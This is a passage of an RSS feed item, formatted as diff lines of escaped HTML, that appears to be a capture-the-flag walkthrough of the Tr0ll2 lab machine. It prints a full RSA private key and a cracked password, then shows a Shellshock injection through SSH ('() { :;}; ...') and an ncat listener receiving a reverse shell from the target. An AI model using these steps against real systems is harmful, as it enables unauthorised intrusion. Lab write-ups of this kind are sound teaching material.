+z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
+e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
+u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
+gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
+UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
+La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
+xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
+aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
+K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
+n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
+TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
+WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
+ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
+0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
+vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
+ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
+th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
+G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
+q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
+vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
+zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Sure it was! The password was &lt;strong&gt;ItCantReallyBeThisEasyRightLOL&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;The next step was obvious. Login as noob through the SSH server.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ssh -i noob noob@192.168.1.63
+TRY HARDER LOL!
+Connection to 192.168.1.63 closed.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;DAMN!&lt;/p&gt;
+
+&lt;p&gt;Trying to pass it some command like ls, uptime or uname did not work. I think I need some heavy artillery… the Shell Shock bug.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ssh noob@192.168.1.63 -i noob &#39;() { :;}; echo &amp;quot;I DO NOT NEED TO&amp;quot;&#39;
+I DO NOT NEED TO
+TRY HARDER LOL!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I think it works… right? I’ve then tried to recreate a reverse shell through the Linux built-in special device tcp while listening on my side with ncat on port 9000.&lt;/p&gt;
+
+&lt;p&gt;In the meantime…&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ncat -lvp 9000
+Ncat: Version 6.46 ( http://nmap.org/ncat )
+Ncat: Listening on :::9000
+Ncat: Listening on 0.0.0.0:9000
+Ncat: Connection from 192.168.1.63.
+Ncat: Connection from 192.168.1.63:37682.
+bash: no job control in this shell
+noob@Tr0ll2:~$
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+  </channel>
+</rss>
